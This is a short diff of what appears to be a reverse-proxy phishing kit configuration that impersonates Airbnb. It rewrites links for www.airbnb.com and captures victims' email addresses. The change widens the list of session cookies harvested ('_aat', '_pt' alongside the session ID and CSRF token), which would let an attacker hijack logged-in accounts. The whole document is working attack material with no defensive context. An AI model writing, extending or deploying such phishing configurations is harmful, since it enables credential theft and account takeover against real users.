@@ -8,7 +8,7 @@ sub_filters:
   - {hostname: 'www.airbnb.com', sub: 'www', domain: 'airbnb.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 auth_tokens:
   - domain: '.airbnb.com'
-    keys: ['_airbed_session_id','_csrf_token']
+    keys: ['_aat','_pt','_airbed_session_id','_csrf_token']
 user_regex:
   key: 'email'
   re: '(.*)'
